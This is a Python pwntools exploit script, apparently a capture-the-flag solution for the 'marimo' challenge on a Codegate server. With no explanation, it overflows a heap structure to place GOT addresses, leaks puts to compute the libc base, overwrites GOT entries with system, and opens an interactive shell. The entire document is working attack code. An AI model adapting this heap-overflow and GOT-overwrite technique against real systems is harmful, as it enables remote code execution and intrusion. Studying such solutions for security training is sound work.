#!/usr/bin/env python
import time
from pwn import *
context.update(arch='x86_64', os='linux')
p, u = pack, unpack

conn = remote('ch41l3ng3s.codegate.kr', 3333)

conn.recvuntil('>> ')

def make_marimo(name, profile):
    conn.sendline('show me the marimo')
    conn.recvuntil('>> ')
    conn.sendline(name)
    conn.recvuntil('>> ')
    conn.sendline(profile)
    conn.recvuntil('>> ')

make_marimo('test', 'test')
make_marimo('test', 'test')

conn.sendline('V')
conn.recvuntil('>> ')
time.sleep(3)
conn.sendline('0')
conn.recvuntil('>> ')
conn.sendline('M')
conn.recvuntil('>> ')

puts_got = 0x603018
strcmp_got = 0x603040

payload = ''
payload += 'A' * 48
payload += p32(1500000000) # time
payload += p32(9999) # price
payload += p(puts_got) # name
payload += p(strcmp_got) # profile
conn.sendline(payload)

conn.sendline('B')
conn.recvuntil('>> ')

conn.sendline('V')
conn.recvuntil('>> ')

conn.sendline('1')
conn.recvuntil('name : ')
addr = conn.recv(6) + '\0\0'

puts = u(addr)
libc_base = puts - 0x6f690
print 'libc_base =', hex(libc_base)

system = libc_base + 0x45390

conn.recvuntil('>> ')

conn.sendline('M')
conn.recvuntil('>> ')

conn.sendline(p(system) * 2)
conn.recvuntil('>> ')

conn.sendline('B')
conn.recvuntil('>> ')

conn.sendline('/bin/sh')

conn.interactive()
